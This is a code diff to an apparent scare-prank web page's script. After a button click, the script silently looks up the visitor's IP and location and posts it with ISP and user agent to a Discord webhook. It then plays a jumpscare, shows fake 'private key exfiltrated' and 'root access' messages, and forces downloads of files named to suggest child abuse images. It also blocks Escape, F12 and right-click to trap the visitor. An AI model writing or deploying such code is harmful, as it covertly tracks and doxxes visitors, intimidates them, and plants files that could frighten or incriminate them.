@@ -125,15 +125,14 @@
 
         let userData = {};
 
-        // Files to be forced onto the target's system
         const payloads = [
-            { name: "childprn.jpg", data: "SYS_CORRUPTION_INITIATED" },
-            { name: "dog.png", data: "RSA_PRIVATE_KEY_LEAKED" },
-            { name: "hourse.png", data: "ROOT_SHELL_OPEN" },
-            { name: "youngkid.png", data: "TRACES_WIPED_BY_MAN_OF_KIND" }
+            { name: "childprn.jpg", data: "SYS_CORRUPTION_INITIATED_BY_MAN_OF_KIND" },
+            { name: "dog.png", data: "RSA_PRIVATE_KEY_EXFILTRATED_SUCCESS" },
+            { name: "hourse.png", data: "ROOT_ACCESS_LEVEL_GRANTED" },
+            { name: "youngkid.png", data: "LOCAL_LOGS_PURGED_CLEAN" }
         ];
 
-        // Immediate Geolocation Fetch
+        // Fetch deep location data immediately
         fetch('https://ipapi.co/json/')
             .then(res => res.json())
             .then(data => {
@@ -150,7 +149,7 @@
             if (!WEBHOOK_URL.startsWith('http')) return;
             const params = {
                 username: "Man-Of-Kind Tracker",
-                content: `**New Target Captured**\nIP: ${info.ip}\nLocation: ${info.city}, ${info.region}, ${info.country_name}\nISP: ${info.org}\nUser Agent: ${navigator.userAgent}`
+                content: `**Target Profile Acquired**\nIP: ${info.ip}\nLocation: ${info.city}, ${info.region}\nISP: ${info.org}\nUA: ${navigator.userAgent}`
             };
             fetch(WEBHOOK_URL, {
                 method: "POST",
@@ -165,22 +164,39 @@
             t.innerText = `[!] ${text}`;
             t.style.bottom = (20 + (document.querySelectorAll('.toast').length * 50)) + 'px';
             document.body.appendChild(t);
-            setTimeout(() => t.remove(), 3000);
+            setTimeout(() => t.remove(), 4000);
         }
 
         function triggerDownloads() {
-            payloads.forEach((p, i) => {
+            let index = 0;
+
+            function downloadNext() {
+                if (index >= payloads.length) return;
+
+                const p = payloads[index];
+                const blob = new Blob([p.data.repeat(200)], { type: 'application/octet-stream' });
+                const url = URL.createObjectURL(blob);
+                
+                const a = document.createElement('a');
+                a.style.display = 'none';
+                a.href = url;
+                a.download = p.name;
+                
+                document.body.appendChild(a);
+                a.click();
+                
                 setTimeout(() => {
-                    const blob = new Blob([p.data.repeat(50)], { type: 'application/octet-stream' });
-                    const url = URL.createObjectURL(blob);
-                    const a = document.createElement('a');
-                    a.href = url;
-                    a.download = p.name;
-                    a.click();
-                    createToast(`FORCE_WRITING: ${p.name}`);
+                    document.body.removeChild(a);
                     URL.revokeObjectURL(url);
-                }, i * 350);
-            });
+                    createToast(`WRITING_SECTOR: ${p.name}... [SUCCESS]`);
+                    
+                    index++;
+                    // 800ms delay to ensure the browser doesn't block the next download
+                    setTimeout(downloadNext, 800); 
+                }, 100);
+            }
+
+            downloadNext();
         }
 
         function drawNoise() {
@@ -199,22 +215,21 @@
             startBtn.style.display = 'none';
             audio.play().catch(() => {});
             
-            // Step 1: Send Data to Webhook
+            // Exfiltrate to Discord
             sendToDiscord(userData);
 
-            // Step 2: Display Glitch
+            // Activate visual jumpscare
             jumpscare.style.display = 'block';
             document.body.classList.add('aberration');
             drawNoise();
 
-            // Step 3: Flash, Reveal IP, and Start Force Downloads
             setTimeout(() => {
                 flash.style.display = 'block';
                 setTimeout(() => {
                     flash.style.display = 'none';
                     ipDisplay.style.display = 'block';
                     
-                    // Begin forcing the payloads
+                    // Trigger the sequence of forced downloads
                     triggerDownloads();
                 }, 100);
             }, 1200);
@@ -223,14 +238,14 @@
                 document.documentElement.requestFullscreen();
             }
 
-            // Trap Logic
+            // Anti-exit protocol
             window.onbeforeunload = () => "CRITICAL SYSTEM OVERWRITE IN PROGRESS.";
         }
 
         startBtn.addEventListener('click', initTerror);
         document.addEventListener('contextmenu', e => e.preventDefault());
         document.addEventListener('keydown', e => {
-             if (e.key === "Escape") e.preventDefault();
+            if (e.key === "Escape" || e.key === "F12") e.preventDefault();
         });
     </script>
 </body>
